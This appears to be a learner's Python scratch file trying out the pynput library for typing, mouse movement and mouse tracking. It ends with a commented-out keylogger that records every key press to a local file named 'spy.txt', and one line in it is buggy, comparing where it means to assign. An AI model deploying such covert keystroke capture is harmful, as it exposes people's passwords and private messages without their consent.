#py -m pip install pynput
#py -m pip install pynput
'''from pynput.keyboard import Controller
def controlkey():
     keyboard=Controller()
     keyboard.type("hi hari")
controlkey()'''
'''from pynput.mouse import Controller
def controlkey():
     mouse=Controller()
     mouse.position=(1370,1000)
controlkey()'''
'''from pynput.mouse import Listener
def writetofile(x,y):
    print('position (x,y) {0}'.format((x,y)) )
with Listener(on_move=writetofile) as l:
    l.join()'''
# from pynput.keyboard import Listener
# def writetofile(key):
#     keydata=str(key)
#     keydata=keydata.replace("'","")
   
#     if  keydata =='Key.space':
#         keydata=" "
#     if  keydata=='Key.shift_r':
#         keydata=""
#     if  keydata=='Key.shift_l': 
#         keydata=""   
#     if keydata=='Key.enter':
#         keydata=="\n"        
#     with open("spy.txt","a") as f:
#         f.write(keydata)

# with Listener(on_press=writetofile) as l:
#     l.join()    